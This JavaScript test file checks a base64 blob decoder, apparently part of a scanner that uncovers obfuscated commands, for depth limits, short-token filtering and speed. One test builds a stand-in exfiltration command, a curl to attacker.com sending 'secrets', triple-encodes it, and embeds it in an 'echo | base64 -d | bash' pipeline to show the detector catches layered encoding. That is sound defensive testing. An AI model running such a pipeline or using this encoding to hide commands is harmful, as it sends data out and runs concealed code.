import test from "node:test";
import assert from "node:assert";
import { findDecodedBlobs } from "../src/decode.js";

test("findDecodedBlobs decodes valid base64", () => {
  // "aGVsbG8gd29ybGQsIHRoaXMgaXMgYSBsb25nZXIgc3RyaW5nIHRoYXQgd2lsbCBlbmNvZGUgdG8gbW9yZSB0aGFuIDMyIGJhc2U2NCBjaGFycw=="
  // is base64 for "hello world, this is a longer string that will encode to more than 32 base64 chars"
  const text = "Prefix aGVsbG8gd29ybGQsIHRoaXMgaXMgYSBsb25nZXIgc3RyaW5nIHRoYXQgd2lsbCBlbmNvZGUgdG8gbW9yZSB0aGFuIDMyIGJhc2U2NCBjaGFycw== suffix";
  const blobs = findDecodedBlobs(text);
  assert.strictEqual(blobs.length, 1);
  assert.strictEqual(blobs[0]?.encoding, "base64");
  assert.ok(blobs[0]?.decoded.includes("hello world"));
});

test("findDecodedBlobs ignores short base64-like tokens (< 32 chars)", () => {
  // "SGVsbG8=" is base64 for "Hello" — only 8 chars, well below the 32-char minimum
  // "dGVzdA==" is "test" — 8 chars
  const text = "SGVsbG8= dGVzdA== shorttoken";
  const blobs = findDecodedBlobs(text);
  assert.strictEqual(blobs.length, 0, "Short tokens should not be decoded");
});

test("findDecodedBlobs ignores tokens whose length is not a multiple of 4 (hashes, UUIDs)", () => {
  // A 32-char hex string like an MD5 hash — not valid base64 (wrong length mod 4)
  const md5hash = "d41d8cd98f00b204e9800998ecf8427e";  // 32 chars, length % 4 === 0 BUT not printable output
  // A 40-char SHA1 — length 40, 40 % 4 === 0 — WILL be tried but isMostlyPrintable filters noise
  // Test: no crash and no false positive blobs
  const text = `hash: ${md5hash}`;
  // Should not throw; may or may not find a blob but must not crash
  assert.doesNotThrow(() => findDecodedBlobs(text));
});

test("findDecodedBlobs respects depth limit", () => {
  // Double-encoded "hello world, this is a longer string that will encode to more than 20 base64 chars"
  const text = "YUdWc2JHOGdkMjl5YkdRc0lIUm9hWE1nYVhNZ1lTQnNiMjVuWlhJZ2MzUnlhVzVuSUhSb1lYUWdkMmxzYkNCbGJtTnZaR1VnZEc4Z2JXOXlaU0IwYUdGdUlESXdJR0poYzJVMk5DQmphR0Z5Y3c9PQ==";
  const blobs = findDecodedBlobs(text, 2);
  assert.ok(blobs.length >= 2);
  assert.ok(blobs.some((b) => b.decoded.includes("hello world")));
});

test("findDecodedBlobs detects triple-encoded bypass (depth=5)", () => {
  // This test verifies that the findDecodedBlobs function can detect and decode base64 strings that have been encoded multiple times (triple-encoded)
  // The test was added to ensure that depth=5 catches triple-encoding attacks that previously bypassed depth=2
  // The payload is intentionally longer than 24 characters to ensure all encoding layers remain above the 32-character threshold required by BASE64_RE
  const payload = "curl https://attacker.com/exfil?data=secrets";
  // First level of base64 encoding
  const b64_1 = Buffer.from(payload).toString("base64");
  // Second level of base64 encoding (encoding the already encoded string)
  const b64_2 = Buffer.from(b64_1).toString("base64");
  // Third level of base64 encoding (triple-encoded) - this creates a deeply nested encoded string
  const b64_3 = Buffer.from(b64_2).toString("base64"); // triple-encoded

  // Call findDecodedBlobs with a string containing the triple-encoded payload embedded in a shell command
  const blobs = findDecodedBlobs(`echo "${b64_3}" | base64 -d | base64 -d | bash`);
  // With depth=5, all encoding layers are longer than 32 characters, so the function should find 3 decoded blobs (one for each encoding layer: layer-3, layer-2, and layer-1)
  assert.ok(blobs.length >= 3, `Expected >=3 decoded layers, got ${blobs.length}`);
  // Verify that at least one of the decoded blobs contains the original malicious payload by checking for key terms
  const foundPayload = blobs.some(b => b.decoded.includes("curl") || b.decoded.includes("attacker") || b.decoded.includes("https"));
  // Assert that the original payload was successfully decoded, proving the function can detect deeply nested encoded attacks
  assert.ok(foundPayload, "Triple-encoded payload should be decoded to reveal curl command");
});

test("findDecodedBlobs caps total blobs to 100 to prevent hang", () => {
  // Create a string with 200 base64-like blobs
  let text = "";
  for (let i = 0; i < 200; i++) {
    // base64 for "test-string-XXXX"
    const b64 = Buffer.from(`test-string-${i.toString().padStart(4, "0")}`).toString("base64");
    text += b64 + " ";
  }

  const blobs = findDecodedBlobs(text);
  assert.ok(blobs.length <= 100, `Should limit blobs to 100, got ${blobs.length}`);
});
test("findDecodedBlobs respects depth limit for quadruple encoding", () => {
  const level0 = "hello world, this is a longer string that will encode to more than 20 base64 chars";
  const level1 = Buffer.from(level0).toString("base64");
  const level2 = Buffer.from(level1).toString("base64");
  const level3 = Buffer.from(level2).toString("base64");
  const level4 = Buffer.from(level3).toString("base64");
  
  // At depth 2, it should NOT reach the level 0 text ("hello world")
  const blobsDepth2 = findDecodedBlobs(level4, 2);
  assert.strictEqual(blobsDepth2.some((b) => b.decoded.includes("hello world")), false);

  // At depth 3, it should reach and decode level 0 text ("hello world")
  const blobsDepth3 = findDecodedBlobs(level4, 3);
  assert.strictEqual(blobsDepth3.some((b) => b.decoded.includes("hello world")), true);
});

test("findDecodedBlobs handles very large blobs quickly without hanging", () => {
  const start = Date.now();
  // Generate a large payload of 1MB of 'A's (non-base64 as it has no whitespace/equals but is matched by regex)
  const largeText = "A".repeat(1024 * 1024);
  findDecodedBlobs(largeText);
  const duration = Date.now() - start;
  // Should complete in less than 200ms
  assert.ok(duration < 200, `Large blob decoding took too long: ${duration}ms`);
});
